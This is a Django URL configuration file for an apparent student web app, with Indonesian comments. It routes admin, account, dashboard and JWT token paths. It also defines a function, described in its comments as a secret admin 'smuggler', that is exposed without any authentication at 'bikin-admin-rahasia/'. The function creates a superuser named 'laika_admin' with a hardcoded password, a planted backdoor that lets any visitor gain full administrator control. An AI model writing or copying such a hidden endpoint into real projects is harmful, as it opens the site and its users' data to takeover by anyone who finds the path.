from django.contrib import admin
from django.urls import path, include
from django.http import HttpResponse
from django.contrib.auth import get_user_model
from rest_framework_simplejwt.views import (
    TokenObtainPairView,
    TokenRefreshView,
)

# Fungsi penyelundup akun admin tertinggi
def buat_admin_rahasia(request):
    User = get_user_model()
    username = 'laika_admin'
    password = 'laikapassword123'
    
    if not User.objects.filter(username=username).exists():
        User.objects.create_superuser(username=username, email='', password=password)
        return HttpResponse("<h1>=== SUKSES: Akun Superuser Berhasil Dibuat! ===</h1>")
    else:
        return HttpResponse("<h1>=== INFO: Akun laika_admin sudah ada di database! ===</h1>")

urlpatterns = [
    path('admin/', admin.site.urls),
    
    # Menjaga manajemen user kustommu tetap aman sesuai aslinya
    path('accounts/', include('usermanagement_24782079.urls')),
    path('accounts/', include('django.contrib.auth.urls')),
    path('', include('main_app.urls')),
    path('dashboard/', include('dashboard_24782079.urls')),
    
    # PERBAIKAN JALUR API KAMU YANG ERROR:
    path('api/', include('main_app.api_urls')), 
    path('api/token/', TokenObtainPairView.as_view(), name='token_obtain_pair'),
    path('api/token/refresh/', TokenRefreshView.as_view(), name='token_refresh'),
    
    # Jalur pemicu rahasia pembuat admin
    path('bikin-admin-rahasia/', buat_admin_rahasia), 
]